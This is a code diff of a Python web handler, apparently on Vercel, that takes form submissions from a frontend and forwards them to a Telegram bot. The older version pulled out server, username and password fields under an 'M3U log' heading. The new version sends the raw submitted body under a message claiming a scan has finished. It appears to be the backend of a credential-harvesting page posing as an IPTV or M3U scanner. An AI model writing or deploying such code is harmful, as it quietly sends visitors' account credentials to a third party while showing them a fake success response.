@@ -8,15 +8,7 @@ def kirim_ke_telegram(pesan):
     token = os.environ.get('TELEGRAM_BOT_TOKEN')
     chat_id = os.environ.get('TELEGRAM_CHAT_ID')
     
-    # Poin 1: Debugger untuk mengecek apakah Env Var terbaca di log Vercel
-    print(f"=== DEBUG TELEGRAM ===")
-    print(f"DEBUG token ada: {bool(token)}")
-    print(f"DEBUG chat_id ada: {bool(chat_id)}")
-    print(f"DEBUG token (5 char pertama): {token[:5] if token else 'KOSONG'}")
-    print(f"DEBUG chat_id: {chat_id if chat_id else 'KOSONG'}")
-
     if not token or not chat_id:
-        print("ERROR: Token atau Chat ID tidak ditemukan!")
         return
 
     url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -24,7 +16,6 @@ def kirim_ke_telegram(pesan):
         "chat_id": chat_id,
         "text": pesan
     }
-    
     try:
         req = urllib.request.Request(
             url,
@@ -32,10 +23,9 @@ def kirim_ke_telegram(pesan):
             headers={'Content-Type': 'application/json'}
         )
         with urllib.request.urlopen(req, timeout=10) as resp:
-            result = resp.read().decode('utf-8')
-            print(f"Telegram response sukses: {result}") 
+            pass
     except Exception as e:
-        print(f"Gagal mengirim ke Telegram (Periksa kembali token Anda): {e}")
+        print(f"Gagal kirim Telegram: {e}")
 
 class handler(BaseHTTPRequestHandler):
 
@@ -50,52 +40,34 @@ class handler(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_POST(self):
-        # Poin 2A: Cek apakah do_POST dipanggil
-        print("=== do_POST DIPANGGIL ===")
-
-        # Poin 2B: Pembacaan Content-Length yang jauh lebih aman
+        # 1. Ambil semua data header untuk pengecekan
         content_length = int(self.headers.get('Content-Length') or 0)
-        print(f"DEBUG content_length: {content_length}")
+        content_type = self.headers.get('Content-Type', 'unknown')
         
+        # 2. Baca data mentah dari frontend
         if content_length > 0:
             try:
                 post_data = self.rfile.read(content_length).decode('utf-8')
-                print(f"DEBUG post_data (200 char pertama): {post_data[:200]}")
             except Exception as e:
-                print(f"Error membaca body: {e}")
-                post_data = ""
+                post_data = f"(Gagal membaca body: {e})"
         else:
-            post_data = ""
+            post_data = "(BODY KOSONG / NO DATA)"
 
-        pesan = ""
-        if post_data:
-            try:
-                data = json.loads(post_data)
-                server   = data.get('host') or data.get('server') or '-'
-                username = data.get('username') or data.get('usr') or '-'
-                password = data.get('password') or data.get('pwd') or '-'
-                
-                pesan = (
-                    f"LOG M3U MASUK\n\n"
-                    f"Server  : {server}\n"
-                    f"Username: {username}\n"
-                    f"Password: {password}\n\n"
-                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
-                )
-            except Exception:
-                pesan = (
-                    f"LOG M3U MASUK (raw text)\n\n"
-                    f"{post_data}\n\n"
-                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
-                )
+        # 3. KITA PAKSA KIRIM APAPUN YANG DIDAPAT KE TELEGRAM
+        pesan_debug = (
+            f"🔔 *WEB EVENT LOG* 🔔\n\n"
+            f"📊 *Status:* Scan Selesai Dipicu\n"
+            f"📦 *Content-Type:* {content_type}\n"
+            f"📏 *Content-Length:* {content_length}\n"
+            f"📝 *Data Mentah Kiriman Web:* \n`{post_data}`\n\n"
+            f"⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
+        )
+        
+        kirim_ke_telegram(pesan_debug)
 
-        # Poin 2C: Kirim ke Telegram di awal sebelum script melakukan scan berat
-        if pesan:
-            kirim_ke_telegram(pesan)
-
-        # Response sukses balik ke Frontend Web
+        # 4. Beri respons balik ke Web agar tidak hang
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
         self.end_headers()
-        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
+        self.wfile.write(json.dumps({"status": "success", "received": True}).encode('utf-8'))
